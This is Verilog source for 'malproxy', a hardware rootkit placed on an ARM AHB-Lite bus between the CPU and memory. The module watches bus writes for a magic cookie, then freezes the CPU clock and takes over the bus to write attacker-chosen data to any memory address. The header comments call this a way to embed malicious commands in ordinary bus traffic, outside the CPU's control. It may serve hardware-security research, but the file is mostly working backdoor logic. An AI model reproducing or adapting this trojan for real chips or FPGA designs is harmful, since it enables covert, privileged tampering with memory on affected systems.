// malproxy AHB_LITE bus 
// This is a small hardware that fits between the bus master (usually the CPU) and a slave I.E. an ARM processor and the memory.
// When the logic see a 56-bit cookie (32 bits+24 bits) it reads a command, data and proceeds to disconnect the CPU
// and execute the command over the main memory (command can be read/write memory)
// This allows to embed malicius data in any bus transfer that can be interpreted by this logic outside control of the main CPU.
// This works mainly on ARM processors as it is compatible with the AHB LITE bus.
// Total logic elements: ~140 (Cyclone IV)
// Total registers: ~90 (Cyclone IV)


module malproxy_ahb_lite    (
// Clocks and resets
input wire HCLK, 
input wire HRESETn ,  

// AHB-LITE OUTPUT PORT
output wire [31:0] HADDR,
output wire HWRITE,
output wire [31:0] HWDATA,
output wire [2:0] HSIZE,
output wire [3:0] HPROT,
output wire [1:0] HTRANS,

// AHB-LITE INPUT PORTs
output wire dHCLK,
input wire [31:0] dHADDR,
input wire [31:0] dHWDATA,
input wire [2:0] dHSIZE,
input wire [ 3:0] dHPROT,
input wire        dHWRITE,
input wire [1:0] dHTRANS
);
 
//------------------------------------------------------------------------------
// Deviated signals
//------------------------------------------------------------------------------

// Clock
reg RTKDeviated;
//wire dHCLK;
assign dHCLK=(RTKDeviated==0)?HCLK:1'h1; // hold the clock up

// AHB transaction address
reg [31:0] RTKAddr;
assign HADDR=(RTKDeviated==0)?dHADDR:RTKAddr;

// AHB write-data
reg [31:0] RTKData;
assign HWDATA=(RTKDeviated==0)?dHWDATA:RTKData;

// AHB size
assign HSIZE=(RTKDeviated==0)?dHSIZE:3'h2; //fixed at dword

// AHB protection: priv; data or inst
assign HPROT=(RTKDeviated==0)?dHPROT:4'h0; //fixed at instr

// AHB write control
reg RTKHWRITE;
assign HWRITE=(RTKDeviated==0)?dHWRITE:RTKHWRITE;

// AHB Transaction control
reg  [1:0] RTKHTRANS;
assign HTRANS=(RTKDeviated==0)?dHTRANS:RTKHTRANS;
//------------------------------------------------------------------------------
// Instantiate Cortex-M0 processor logic level
//------------------------------------------------------------------------------
 
 
//------------------------------------------------------------------------------
// Trivial rootkit coprocessor unit
//------------------------------------------------------------------------------
reg [5:0] RTKState;
reg [8:0] RTKCmd;

reg [3:0] RTKCount;
`define RTK_FIND_START	5'h0
`define RTK_FIND_CMD	5'h1
`define RTK_FIND_DATA	5'h2
`define RTK_FIND_ADDR	5'h3
`define RTK_EXEC	5'h4
`define RTK_EXEC2	5'h5
`define RTK_END		5'h6
`define RTK_CMD_WRITE	"W"
`define RTK_CMD_READ	"R"

// 56-bit initial trigger cookie
// I.E. memcpy "\x78\x56\x34\x12R\xaa\x55\xaa";
`define RTK_COOKIE_1 32'h12345678
`define RTK_COOKIE_2 24'h434241
`define RTK_COOKIE_3 24'h2D2D2D  // ---

always @(posedge HCLK or negedge HRESETn)
	begin
	if (!HRESETn) // Reset
		begin
		RTKState<=`RTK_FIND_START;
		RTKDeviated<=0;
		end
	else	begin
		case (RTKState)
			`RTK_FIND_START: // Find first part of cookie
				if ( HWDATA ==`RTK_COOKIE_1)
					begin
//					$display("START: Trans, Addr: %x Data: %x %x",HADDR,HWDATA,HRDATA);
					RTKState<=`RTK_FIND_CMD;
					end
			`RTK_FIND_CMD: // Load second part of cookie and single-byte command
				begin
				if ( HWDATA[31:8] ==`RTK_COOKIE_2)
					begin
//					$display("FIND CMD: Trans, Addr: %x Data: %x %x",HADDR,HWDATA,HRDATA);
					RTKCmd<=HWDATA[7:0];
					RTKState<=`RTK_FIND_DATA;
					RTKCount<=0;
					end
				else	RTKState<=`RTK_FIND_START;
				end
			`RTK_FIND_DATA: // Load data
				begin
				if ( HWDATA[31:8] ==`RTK_COOKIE_3)
					begin
					if (RTKCount==3) // data loaded, go to loading address
						begin
						RTKState<=`RTK_FIND_ADDR;
						RTKCount<=0;
						end
					else	RTKCount<=RTKCount+4'h1;
					RTKData[31:8]<=RTKData[23:0];
					RTKData[7:0]<=HWDATA[7:0];
					end
				end
			`RTK_FIND_ADDR: // Load address
				begin
				if ( HWDATA[31:8] ==`RTK_COOKIE_3)
					begin
					if (RTKCount==3) // Address loaded, go to exec
						begin
						RTKState<=`RTK_EXEC;
						RTKDeviated<=1;
						end
					else	RTKCount<=RTKCount+4'h1;
					RTKAddr[31:8]<=RTKAddr[23:0];
					RTKAddr[7:0]<=HWDATA[7:0];
					end
				end
			`RTK_EXEC: // Exec command
				begin
				case (RTKCmd) // Parse command
					`RTK_CMD_WRITE:
						begin
//						$display("WRITING %x to %x",RTKData,RTKAddr);
						RTKHWRITE<=1;
						RTKHTRANS<=2;
						RTKState<=`RTK_EXEC2;
						end
					`RTK_CMD_READ:
						begin
//						$display("READING %x to %x",RTKData,RTKAddr);
						// Not implemented yet!
						RTKState<=`RTK_FIND_START;
						end
				endcase
				end
			`RTK_EXEC2: // 2nd clock of transaction
				begin
				RTKHWRITE<=0;
				RTKState<=`RTK_END;
				end
			`RTK_END: // End command (restore CPU functionality)
				begin
				$display("END");
				RTKDeviated<=0; // Nothing to see here, move along...
				RTKHWRITE<=0;
				RTKState<=`RTK_FIND_START;
				end

		endcase
		end
	end
endmodule
